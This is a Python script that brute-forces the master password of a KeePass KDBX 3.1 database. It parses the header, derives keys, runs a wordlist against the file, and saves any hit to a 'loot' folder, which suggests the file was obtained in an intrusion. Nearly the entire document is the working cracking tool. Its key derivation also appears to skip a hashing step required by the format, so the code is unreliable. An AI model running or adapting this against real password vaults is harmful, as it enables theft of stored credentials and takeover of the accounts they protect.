#!/usr/bin/env python3
"""KDBX 3.1 master-password verifier / brute-forcer.

Header parsed manually, key derivation per KeePass KDBX 3.1 spec:
  composite  = SHA256(SHA256(password))
  transformed= AES-ECB(transformSeed)^rounds over composite key material
  masterKey  = SHA256(masterSeed || transformed)
Verification: AES-256-CBC decrypt payload, first 32 bytes must equal StreamStartBytes.
"""
import hashlib, struct, sys, time
from Cryptodome.Cipher import AES

KDBX_PATH = sys.argv[1] if len(sys.argv) > 1 else "loot/incident-support.kdbx"

FIELD = {0: "EndOfHeader", 1: "Comment", 2: "CipherID", 3: "CompressionFlags",
         4: "MasterSeed", 5: "TransformSeed", 6: "TransformRounds", 7: "EncryptionIV",
         8: "ProtectedStreamKey", 9: "StreamStartBytes", 10: "InnerRandomStreamID"}


def parse_header(data):
    if struct.unpack("<II", data[:8]) != (0x9AA2D903, 0xB54BFB67):
        raise SystemExit("not a kdbx file")
    ver = struct.unpack("<I", data[8:12])[0]
    off, hdr = 12, {}
    while True:
        t, n = struct.unpack("<BH", data[off:off + 3])
        off += 3
        v = data[off:off + n]
        off += n
        hdr[FIELD.get(t, t)] = v
        if t == 0:
            break
    if (ver >> 16) != 3:
        raise SystemExit("unexpected kdbx version %x" % ver)
    return hdr, data[off:]


HDR, PAYLOAD = parse_header(open(KDBX_PATH, "rb").read())
MASTER_SEED = HDR["MasterSeed"]
TRANSFORM_SEED = HDR["TransformSeed"]
ROUNDS = struct.unpack("<Q", HDR["TransformRounds"])[0]
IV = HDR["EncryptionIV"]
START = HDR["StreamStartBytes"]
print("file=%s rounds=%d cipher_iv=%s payload=%d bytes" % (KDBX_PATH, ROUNDS, IV.hex(), len(PAYLOAD)))


def master_key(password: str) -> bytes:
    comp = hashlib.sha256(hashlib.sha256(password.encode()).digest()).digest()
    if ROUNDS:
        c = AES.new(TRANSFORM_SEED, AES.MODE_ECB)
        for _ in range(ROUNDS):          # 1 round here -> aes(key=seed) once
            comp = c.encrypt(comp)
    return hashlib.sha256(MASTER_SEED + comp).digest()


def try_password(pw: str) -> bool:
    k = master_key(pw)
    # cheap pre-filter: decrypt only the first block and compare block 0 of startbytes
    pt = AES.new(k, AES.MODE_CBC, IV).decrypt(PAYLOAD[:16])
    return pt == START[:16]  # StreamStartBytes is 32 bytes; block0 match is strong


def main():
    pws = [l.rstrip("\r\n") for l in open(sys.argv[2], encoding="utf-8", errors="ignore")]
    t0 = time.time()
    for i, pw in enumerate(pws, 1):
        if try_password(pw):
            print("FOUND after %d tries: %r" % (i, pw))
            open("loot/kdbx_master_password.txt", "w").write(pw + "\n")
            return
        if i % 20000 == 0:
            r = i / (time.time() - t0)
            print("  %d tried, %.0f/s" % (i, r), flush=True)
    print("exhausted %d candidates in %.1fs" % (len(pws), time.time() - t0))


if __name__ == "__main__":
    main()
